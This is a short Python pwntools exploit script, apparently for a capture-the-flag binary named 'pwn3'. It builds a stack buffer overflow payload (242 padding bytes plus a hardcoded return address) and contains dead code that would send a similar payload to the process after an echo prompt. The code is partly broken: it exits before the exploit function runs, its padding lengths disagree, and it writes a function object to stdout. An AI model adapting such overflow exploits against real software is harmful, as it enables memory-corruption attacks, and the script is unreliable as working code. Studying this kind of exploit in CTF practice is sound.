#!/usr/bin/env python

from pwn import *
import os
import sys
import r2pipe

context.arch = 'i386'
context.log_level = 'info'

payload = 'A' * 242
#payload += 'B' * 4
payload += p32(0xffe4f90a)
sys.stdout.write(payload)

exit(0)


io = process('./pwn3') 

def exploit():
    try:
        io.recvuntil('Now what should I echo?')
        io.send('A' * 243)
	io.sendline(p32(0xffe4f90a))

	sys.stdout.write(exploit)

    except Exception as e:
        exc_type, exc_obj, exc_tb = sys.exc_info()
        fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
        log.error("Exception catched on line %d %s" % (exc_tb.tb_lineno, e))

if __name__ == "__main__":
    exploit()
